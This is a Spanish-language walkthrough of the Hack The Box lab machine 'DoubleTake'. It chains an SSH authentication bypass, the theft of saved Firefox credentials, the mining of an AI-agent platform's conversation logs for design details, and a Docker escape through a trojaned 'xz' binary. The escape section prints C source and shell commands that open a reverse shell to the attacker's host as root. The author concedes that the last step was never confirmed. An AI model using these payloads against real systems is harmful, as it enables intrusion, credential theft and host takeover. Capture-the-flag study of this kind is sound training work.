---
title: "HTB DoubleTake - Write-Up"
date: 2026-11-13
categories: [Hack The Box]
tags: [openssh-musl-auth-bypass, basic-auth, firefox-credential-theft, ai-agent-logs, docker-xz-path-hijack-rce]
---

## Introducción

DoubleTake es una máquina Linux que combina un bypass de autenticación en OpenSSH sobre un contenedor Alpine (variante de una condición de carrera en `musl libc` al procesar contraseñas extremadamente largas), robo de credenciales desde el perfil de Firefox del propio contenedor para acceder a una plataforma interna de agentes de IA (Zentara), minería de las conversaciones de esos agentes para reconstruir la arquitectura de la app, y un escape de contenedor Docker explotando cómo el daemon resuelve el binario `xz` al descomprimir archivos subidos.

**Ruta general:** escaneo de puertos (`22`, `80`) sobre `10.129.248.123` → el puerto 80 exige Basic Auth (`realm=Zentara`) y, al no tener registro PTR ni vhosts, se descarta como vía de fuerza bruta → el puerto 22 corre OpenSSH 10.6, vulnerable a **CVE-2026-123158** sólo si el sistema subyacente usa `musl libc` sin PAM — se confirma que, aunque nginx anuncia Ubuntu, SSH habla con un contenedor Alpine aparte → bypass de autenticación enviando una contraseña de ~300 bytes contra la cuenta `alpine` (cuenta cloud sin contraseña real, campo `*` en `/etc/shadow`) → **flag de usuario** → `doas`/escalada directa descartada → se localizan credenciales guardadas de Firefox en `logins.json` dentro del home de `alpine`, válidas para el Basic Auth de Zentara (`bob:CorrectHorseBatteryStaple`) → dentro de la plataforma Zentara se encuentran conversaciones guardadas de varios agentes de IA (CodePilot, SentinelScan, DocWeaver) que, sin saberlo, filtran el diseño interno del sistema de despliegues: el worker de descompresión de la plataforma invoca el binario `xz` para procesar archivos `.tar.xz` subidos, abriendo la puerta a **CVE-2026-41567** (Docker resuelve `xz`/`unpigz` desde el filesystem del contenedor en vez del host) → tras varios intentos fallidos con scripts de shell, la explotación real requiere un binario `xz` troyano compilado estáticamente en C que hace `mount`/`chroot` sobre `/proc/1/root` para alcanzar el filesystem real del host y lanzar una reverse shell como root.

## Fase 1 — Reconocimiento

```bash
nmap -sVC -p22,80 -oN targeted 10.129.248.123
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 UNAUTHORIZED
|_  Basic realm=Zentara
```

El puerto 80 exige autenticación básica HTTP bajo el realm `Zentara`. Sin PTR (`dig -x`/`nslookup` devuelven `NXDOMAIN`) y sin vhosts descubribles (`gobuster vhost` no da resultados — es una IP de laboratorio sin dominio base), se descarta esa vía de enumeración.

Un primer fuzzing de rutas con wfuzz devuelve `401` uniforme con `0 Ch` en toda ruta probada (`agents`, `deploy`, `docs`, `files`, `settings`, `status`, `usage`), lo que en un primer momento parece indicar `auth_basic` aplicado a todo el server block. Sin embargo, una petición a una ruta inexistente aclara la situación:

```bash
curl -i http://10.129.248.123/esto-no-existe-jamas-12345
# 404
```

> **Punto clave:** una ruta inexistente da `404`, no `401`. Esto significa que las rutas que sí devuelven `401` (`agents`, `deploy`, `docs`...) **existen realmente** en la configuración de nginx y están protegidas por auth, mientras que lo que no existe da `404`. El fuzzing sí es útil aquí — simplemente hay que filtrar `--hc 404` en vez de intentar aislar por tamaño de respuesta.

## Fase 2 — Bypass de autenticación SSH (CVE-2026-123158)

Fuerza bruta contra el Basic Auth del puerto 80 no da resultado. El banner de OpenSSH (10.6, anterior a 10.6p2) encaja con **CVE-2026-123158**: cuando `musl libc` procesa una contraseña de más de 256 bytes, su `crypt()` devuelve `*` en lugar de un hash — y si existe una cuenta cuyo campo de contraseña en `/etc/shadow` es exactamente `*` (cuenta sin contraseña real, solo-clave), la comparación `* == *` tiene éxito y SSH concede acceso sin conocer ninguna contraseña real.

La vulnerabilidad requiere Linux + `musl libc` (Alpine) + OpenSSH sin PAM + `PasswordAuthentication yes` + una cuenta con `*` en shadow. Aunque nginx se anuncia como Ubuntu, SSH resulta hablar con un contenedor Alpine aparte, y la condición se cumple contra la cuenta `alpine` — el usuario "de puerta trasera" que las imágenes cloud oficiales de Alpine (3.18.11–3.24.3) crean por defecto sin contraseña real.

```bash
pip install paramiko
python3 poc_cve_2026_123158_sshole.py --target 10.129.248.123 --port 22 --user alpine
```

> **Por qué funciona:** el PoC envía una contraseña de ~256-1024 bytes para el usuario `alpine`. `musl libc` falla al procesar una contraseña tan larga y su `crypt()` devuelve `*`; como el hash almacenado para `alpine` en `/etc/shadow` es también `*` (cuenta sin contraseña real, pensada solo para login por clave), la comparación de cadenas coincide y SSH autentica sin que exista ninguna contraseña válida que adivinar.

```bash
id
# uid=1000(alpine)
```

### Flag de usuario

```bash
cat /home/alpine/user.txt
```

## Fase 3 — Escalada directa descartada; credenciales de Firefox

El usuario `alpine` no tiene `doas` configurado hacia root en este caso (vía explorada y descartada: `doas -u root /bin/sh` no da acceso). Se busca en su lugar cualquier credencial guardada en el filesystem del contenedor:

```bash
find / -name "logins.json" 2>/dev/null
# /home/alpine/.mozilla/firefox/zentara.default/logins.json
```

```bash
cat /home/alpine/.mozilla/firefox/zentara.default/logins.json
```

```json
{"nextId":2,"logins":[{"id":1,"hostname":"http://172.17.0.1","httpRealm":"Zentara",
"encryptedUsername":"Ym9i","encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==", ...}]}
```

> **Punto clave:** sin contraseña maestra configurada, Firefox solo codifica los campos `encryptedUsername`/`encryptedPassword` en Base64 — no hay cifrado real que romper. `hostname: http://172.17.0.1` es además la IP del gateway Docker vista desde dentro del contenedor, confirmando que la app web del puerto 80 corre en el host, no en este contenedor.

```bash
echo 'Ym9i' | base64 -d          # bob
echo 'Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==' | base64 -d   # CorrectHorseBatteryStaple
```

```bash
curl -u bob:CorrectHorseBatteryStaple http://10.129.248.123 -o /dev/null -w "%{http_code}\n"
# 200
```

Con `bob:CorrectHorseBatteryStaple` se obtiene acceso completo a la plataforma Zentara (rutas `agents`, `deploy`, `docs`, `files`, `settings`, `status`, `usage`, antes bloqueadas por el 401).

## Fase 4 — Minando las conversaciones de los agentes de IA

Zentara resulta ser una plataforma de desarrollo asistido por agentes de IA (CodePilot, SentinelScan, DocWeaver), cada uno con un historial de conversaciones accesible. Revisando ese historial se reconstruye, sin que ningún agente lo pretenda, la arquitectura completa del sistema de despliegues:

- La app es un backend FastAPI + SQLAlchemy en `/workspace/api-service`, con JWT y variable `JWT_SECRET`.
- El Dockerfile usa base **Alpine** multi-stage, el proceso corre como usuario no-root y expone el puerto 8000 detrás del nginx del puerto 80.
- Los despliegues se procesan de forma asíncrona con un worker `arq`+Redis que desempaqueta el archivo subido, y, cita textual de CodePilot: *"For xz it shells out to the xz binary on the host since Python's lzma module is significantly slower for large archives."*
- Todos los agentes comparten el mismo `workspace` y filesystem persistente.

> **Por qué importa:** la frase de CodePilot confirma el vector completo de **CVE-2026-41567** — el motor de despliegue, al recibir un `.tar.xz`, invoca el binario `xz` real del sistema (vía `subprocess`/`shell out`) en lugar de usar una librería interna. Docker, en versiones anteriores a 29.5.1, resuelve ese binario desde el filesystem del **contenedor** en lugar del host al ejecutar `PUT /containers/{id}/archive`. Si se logra que el `xz` que el contenedor expone sea un binario propio, el daemon (que corre como root en el host) lo ejecutará con esos privilegios.

El historial de despliegues (`Deployment History`) confirma además que la plataforma ya procesa normalmente `.tar.xz` hacia rutas como `/workspace/api-service` o `/workspace/db`, validando que el flujo de descompresión vía `xz` es real y habitual, no una ruta de error.

## Fase 5 — Explotación de CVE-2026-41567: envenenar el `xz` del contenedor

La técnica consta de dos subidas a través del endpoint de despliegue de Zentara (`/deploy`, autenticado con `bob`):

1. **Plant** — un `.tar` (sin comprimir, para no disparar aún la descompresión) que contiene la ruta `usr/bin/xz` con el binario troyano, subido con *Target path* `/` para que se extraiga exactamente en `/usr/bin/xz` del contenedor.
2. **Trigger** — un `.tar.xz` normal, cuya descompresión fuerza al motor a invocar el `xz` ya envenenado.

```bash
curl -u bob:CorrectHorseBatteryStaple -F 'archive=@plant.tar' -F 'workspace=/' http://10.129.248.123/deploy
```

```bash
echo x > t && tar cf - t | xz > trigger.tar.xz
curl -u bob:CorrectHorseBatteryStaple -F 'archive=@trigger.tar.xz' -F 'workspace=/workspace' http://10.129.248.123/deploy
```

> **Nota — primeros intentos descartados:** sustituir `xz` por un script de shell (`#!/bin/sh` + `busybox nc <IP> 4444 -e /bin/sh`) deja el *plant* en `success`, pero el *trigger* nunca produce conexión (en algunos casos la web devuelve `Engine returned 500`, que resulta ser una señal **positiva**: el daemon llegó a invocar el troyano y se quedó esperando la respuesta del comando — el error es el timeout de la petición HTTP, no un fallo del exploit). El problema real es que un script interpretado no es suficiente para saltar del namespace del contenedor al filesystem real del host.

La explotación que finalmente funciona sustituye el script por un **binario C compilado estáticamente** que monta `/proc` dentro del propio proceso y usa `chroot` sobre `/proc/1/root` — el enlace que, desde dentro de un contenedor con los privilegios adecuados, apunta al filesystem raíz real visto por el PID 1 del host:

```c
// xz.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root");
    chdir("/");
    execl("/bin/bash", "bash", "-c",
          "bash -i >& /dev/tcp/<IP_TUN0>/4444 0>&1", NULL);
    return 1;
}
```

```bash
gcc -static -o xz xz.c
mkdir -p pkg/usr/bin && cp xz pkg/usr/bin/xz
cd pkg && tar cf ../plant.tar usr/bin/xz && cd ..
```

```bash
# listener
nc -lvnp 4444

# 1. Plant: sobrescribe /usr/bin/xz del contenedor
curl -u bob:CorrectHorseBatteryStaple -F 'archive=@plant.tar' -F 'workspace=/' http://10.129.248.123/deploy

# 2. Trigger: fuerza la descompresión, que invoca el xz troyano
echo x > t && tar cf - t | xz > trigger.tar.xz
curl -u bob:CorrectHorseBatteryStaple -F 'archive=@trigger.tar.xz' -F 'workspace=/workspace' http://10.129.248.123/deploy
```

> **Por qué funciona:** el daemon de Docker, al procesar la extracción del archivo subido (`PUT /containers/{id}/archive` en versiones < 29.5.1), resuelve el binario `xz`/`unpigz` desde el filesystem del **contenedor** en lugar de usar el binario del host, y lo ejecuta con los privilegios del propio daemon — root en el host. Al compilarlo estáticamente en C y hacer `mount("proc", ...)` + `chroot("/proc/1/root")`, el binario escapa del namespace de montaje del contenedor y se sitúa en el filesystem real del host (vía la referencia que el propio kernel mantiene para el PID 1), desde donde lanza la reverse shell ya como root del sistema anfitrión. La petición HTTP a `/deploy` se queda esperando y acaba devolviendo `500` por timeout — comportamiento esperado, no un fallo.

### Flag de root

```bash
id
cat /root/root.txt
```

> **Nota del autor:** la conversación no llega a mostrar la salida confirmada de esta última conexión (se corta justo después de lanzar el exploit final), así que no puedo pegar aquí el contenido real de `root.txt`. Si al reproducir estos pasos la shell no llega como root del host, el punto a revisar primero es que `/proc/1/root` sea accesible desde el contenedor (depende de los privilegios/namespaces con los que arranca) y que la IP en el binario C corresponda a la interfaz `tun0` activa en el momento del ataque.
